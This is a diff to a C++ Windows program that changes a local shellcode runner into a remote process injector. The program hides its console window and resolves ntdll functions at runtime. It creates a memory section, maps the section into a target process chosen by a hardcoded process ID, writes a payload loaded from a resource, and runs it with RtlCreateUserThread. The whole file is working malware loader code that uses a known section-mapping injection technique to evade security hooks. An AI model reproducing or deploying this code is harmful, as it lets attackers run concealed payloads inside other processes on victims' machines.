@@ -1,34 +1,114 @@
 ﻿#include <iostream>
 #include <string>
 #include <windows.h>
-#include <winternl.h>
 #include "resource.h"
 
-typedef NTSTATUS(NTAPI* NT_ALLOCATE_VIRTUAL_MEMORY) (
-	HANDLE ProcessHandle,
-	PVOID* BaseAddress,
-	ULONG_PTR ZeroBits,
-	PSIZE_T RegionSize,
-	ULONG AllocationType,
-	ULONG Protect
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+
+/* enums */
+typedef enum _SECTION_INHERIT {
+	ViewShare = 1,
+	ViewUnmap = 2
+} SECTION_INHERIT, * PSECTION_INHERIT;
+
+
+/* structs */
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG Length;
+	HANDLE RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG Attributes;
+	PVOID SecurityDescriptor;
+	PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+
+/* functions */
+typedef NTSTATUS(NTAPI* NT_CREATE_SECTION) (
+	OUT PHANDLE SectionHandle,
+	IN ULONG DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN PLARGE_INTEGER MaximumSize OPTIONAL,
+	IN ULONG PageAttributess,
+	IN ULONG SectionAttributes,
+	IN HANDLE FileHandle OPTIONAL
 	);
-NT_ALLOCATE_VIRTUAL_MEMORY NtAllocateVirtualMemory;
+NT_CREATE_SECTION NtCreateSection;
+
+typedef NTSTATUS(NTAPI* NT_MAP_VIEW_OF_SECTION) (
+	IN HANDLE SectionHandle,
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress OPTIONAL,
+	IN ULONG ZeroBits OPTIONAL,
+	IN ULONG CommitSize,
+	IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
+	IN OUT PULONG ViewSize,
+	IN SECTION_INHERIT InheritDisposition,
+	IN ULONG AllocationType OPTIONAL,
+	IN ULONG Protect
+	);
+NT_MAP_VIEW_OF_SECTION NtMapViewOfSection;
+
+typedef NTSTATUS(NTAPI* NT_UNMAP_VIEW_OF_SECTION) (
+	IN HANDLE ProcessHandle,
+	IN PVOID BaseAddress
+	);
+NT_UNMAP_VIEW_OF_SECTION NtUnmapViewOfSection;
 
 typedef NTSTATUS(NTAPI* NT_WRITE_VIRTUAL_MEMORY) (
-	HANDLE ProcessHandle,
-	PVOID BaseAddress,
-	PVOID Buffer,
-	ULONG NumberOfBytesToWrite,
-	PULONG NumberOfBytesWritten OPTIONAL);
+	IN HANDLE ProcessHandle,
+	IN PVOID BaseAddress,
+	IN PVOID Buffer,
+	IN ULONG NumberOfBytesToWrite,
+	OUT PULONG NumberOfBytesWritten OPTIONAL
+	);
 NT_WRITE_VIRTUAL_MEMORY NtWriteVirtualMemory;
 
-typedef NTSTATUS(NTAPI* NT_FREE_VIRTUAL_MEMORY) (
-	HANDLE  ProcessHandle,
-	PVOID* BaseAddress,
-	PSIZE_T RegionSize,
-	ULONG   FreeType
+typedef NTSTATUS(NTAPI* NT_OPEN_PROCESS) (
+	OUT PHANDLE ProcessHandle,
+	IN ACCESS_MASK AccessMask,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
+	IN PCLIENT_ID ClientId OPTIONAL
 	);
-NT_FREE_VIRTUAL_MEMORY NtFreeVirtualMemory;
+NT_OPEN_PROCESS NtOpenProcess;
+
+typedef NTSTATUS(NTAPI* RTL_CREATE_USER_THREAD) (
+	IN HANDLE ProcessHandle,
+	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+	IN BOOLEAN CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN OUT PULONG StackReserved,
+	IN OUT PULONG StackCommit,
+	IN PVOID StartAddress,
+	IN PVOID StartParameter OPTIONAL,
+	OUT PHANDLE ThreadHandle,
+	OUT PCLIENT_ID ClientID
+	);
+RTL_CREATE_USER_THREAD RtlCreateUserThread;
+
+typedef NTSTATUS(NTAPI* NT_WAIT_FOR_SINGLE_OBJECT) (
+	IN HANDLE ObjectHandle,
+	IN BOOLEAN Alertable,
+	IN PLARGE_INTEGER TimeOut OPTIONAL
+	);
+NT_WAIT_FOR_SINGLE_OBJECT NtWaitForSingleObject;
+
+typedef NTSTATUS(NTAPI* NT_CLOSE) (
+	IN HANDLE ObjectHandle
+	);
+NT_CLOSE NtClose;
 
 void checkNtStatus(const NTSTATUS status);
 const std::string loadPayload();
@@ -38,37 +118,67 @@ int main(int argc, char** argv)
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
-	if (ntdll == NULL) {
-		printf("Could not find ntdll. Exiting...\n");
-		return 1;
+	if (ntdll == NULL)
+	{
+		exit(1);
 	}
-	NTSTATUS ntStatus;
-	NtAllocateVirtualMemory = (NT_ALLOCATE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+	NTSTATUS status;
+	NtCreateSection = (NT_CREATE_SECTION)GetProcAddress(ntdll, "NtCreateSection");
+	NtMapViewOfSection = (NT_MAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtMapViewOfSection");
+	NtUnmapViewOfSection = (NT_UNMAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtUnmapViewOfSection");
 	NtWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
-	NtFreeVirtualMemory = (NT_FREE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtFreeVirtualMemory");
+	NtOpenProcess = (NT_OPEN_PROCESS)GetProcAddress(ntdll, "NtOpenProcess");
+	RtlCreateUserThread = (RTL_CREATE_USER_THREAD)GetProcAddress(ntdll, "RtlCreateUserThread");
+	NtWaitForSingleObject = (NT_WAIT_FOR_SINGLE_OBJECT)GetProcAddress(ntdll, "NtWaitForSingleObject");
+	NtClose = (NT_CLOSE)GetProcAddress(ntdll, "NtClose");
 
 	const std::string payload = loadPayload();
-	HANDLE currentProcess = GetCurrentProcess();
 	SIZE_T size = payload.size();
-	PVOID exec = NULL;
+	LARGE_INTEGER sectionSize = { size };
+	HANDLE currentProcess = GetCurrentProcess();
+	HANDLE section = NULL;
+	HANDLE targetProcess = NULL;
+	HANDLE targetProcessThread = NULL;
+	PVOID localSection = NULL, targetSection = NULL;
 
-	ntStatus = NtAllocateVirtualMemory(currentProcess, &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	checkNtStatus(ntStatus);
+	status = NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+	checkNtStatus(status);
 
-	ntStatus = NtWriteVirtualMemory(currentProcess, exec, (PVOID)payload.c_str(), size, 0);
-	checkNtStatus(ntStatus);
+	status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
+	checkNtStatus(status);
 
-	((void(*)())exec)();
+	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 7332);
 
-	ntStatus = NtFreeVirtualMemory(currentProcess, &exec, 0, MEM_RELEASE);
-	checkNtStatus(ntStatus);
+	status = NtMapViewOfSection(section, targetProcess, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
+	checkNtStatus(status);
+
+	status = NtWriteVirtualMemory(currentProcess, localSection, (PVOID)payload.c_str(), size, NULL);
+	checkNtStatus(status);
+
+	status = RtlCreateUserThread(targetProcess, NULL, FALSE, 0, 0, 0, targetSection, NULL, &targetProcessThread, NULL);
+	checkNtStatus(status);
+
+	status =  NtWaitForSingleObject(targetProcessThread, FALSE, NULL);
+	checkNtStatus(status);
+
+	status = NtClose(targetProcessThread);
+	checkNtStatus(status);
+	status = NtUnmapViewOfSection(targetProcess, targetSection);
+	checkNtStatus(status);
+	status = NtClose(targetProcess);
+	checkNtStatus(status);
+
+	status = NtUnmapViewOfSection(currentProcess, localSection);
+	checkNtStatus(status);
+	status = NtClose(section);
+	checkNtStatus(status);
 
 	FreeLibrary(ntdll);
 
 	return 0;
 }
 
-void checkNtStatus(const NTSTATUS status)
+void checkNtStatus(NTSTATUS status)
 {
 	if (!NT_SUCCESS(status)) {
 		printf("Failed in calling NtAllocateVirtualMemory(). Error code: 0x%16x\n", status);
